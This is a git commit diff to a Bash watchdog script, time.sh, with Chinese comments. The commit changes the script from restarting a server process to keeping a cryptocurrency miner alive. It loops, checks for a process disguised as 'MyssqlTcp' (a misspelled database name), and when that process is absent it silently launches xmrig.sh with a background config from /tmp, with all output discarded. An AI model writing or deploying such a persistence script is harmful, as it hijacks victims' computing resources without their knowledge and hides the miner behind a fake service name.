e015f483da87b34779aace81374824a12a277e4d
teshushu <905353149@qq.com>
2023-01-20 03:30:51 +0800

    Update time.sh

--- Bash/time.sh
+++ Bash/time.sh
@@ -1,14 +1,14 @@
 #!/bin/sh
 
 #添加本地执行路径
-export LD_LIBRARY_PATH=./tmp/myssqltcp/
+export LD_LIBRARY_PATH=/tmp/myssqltcp/
 
 while true; do
         #启动一个循环，定时检查进程是否存在
-        server=`ps aux | grep CenterServer_d | grep -v grep`
+        server=`ps aux | grep MyssqlTcp | grep -v grep`
         if [ ! "$server" ]; then
             #如果不存在就重新启动
-            nohup ./CenterServer_d -c 1 &
+            /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
             #启动后沉睡10s
             sleep 10
         fi
